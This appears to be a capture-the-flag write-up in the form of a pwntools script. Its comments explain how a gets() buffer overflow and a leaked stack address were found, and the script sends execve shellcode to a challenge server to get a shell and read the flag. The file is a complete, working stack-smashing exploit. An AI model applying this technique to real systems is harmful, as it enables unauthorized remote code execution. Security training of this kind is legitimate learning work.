#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# When starting the program, we are given several options to select. Option 3 asks 
# for a password as input, and it says that if you enter the correct password it will
# display the flag. However, if we actually look at the binary ninja assembly, we can
# see it simply checks the length of my input, and if it is more than 0x50 (or 80)
# characters, it prints some address on the stack.
 
# To determine what this address is, we again look in binary ninja, and can see it
# is the start of the buffer that takes in your option selected. For example, if
# selecting option 3 when prompted and then printing the contents of the address
# using x 0xffffce90 in gdb, it contains the value 3.

# Also, option 1 asks us to input our name into a buffer, yet using binary ninja we 
# can see this uses gets, so we can overflow it. Hence, since we have a buffer we
# can overflow and an address on the stack, we can create a payload to jump to this
# address and then execute shellcode to pop a shell.

# To begin, we want to determine the offsets of the return address and the stack
# address. Using gdb, we can use cyclic 300 and input this into the buffer. Then,
# when attempting to return it displays 'Invalid address 0x616f6161'. Using cyclic -l
# 0x616f6161, it gives 54, meaning the return address is at an offset of 54 bytes
# from the start of the buffer. To determine the offset of the stack address, since
# we know it is 0xffffce90 from earlier (and gdb turns off ASLR so it will remain
# the same), we can simply do cyclic -l 0x61706261, which gives 158.

# Hence, our payload will have the stack address at offset 54, and our shellcode at
# offset 158. This will overwrite the return address of our function, instead jumping
# to the shellcode and executing it to pop a shell.

# The script:

p = remote("plsdonthaq.me", 4002)

# We first select option 3 and send 80 bytes so it passes the condition and
# prints the stack address
p.sendline("3")
p.sendline(b"A"*80)

# We then extract this address printed
p.recvuntil("offset ")
stackAddress = int(p.recvline()[:-1], 0)

# Then we select option 1 so we can input our payload into the buffer
p.sendline("1")

# This is the shellcode to pop a shell
shellcode = asm("""
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, SYS_execve
int 0x80
""")

# Finally we send our payload, which consists of the stack address at offset 54,
# and the shellcode at offest 158, with anything being placed in the other positions 
p.sendline(flat({
  54: p32(stackAddress),
  158:shellcode
  }))

# We will now have shell access, using cat flag to print the flag
p.interactive()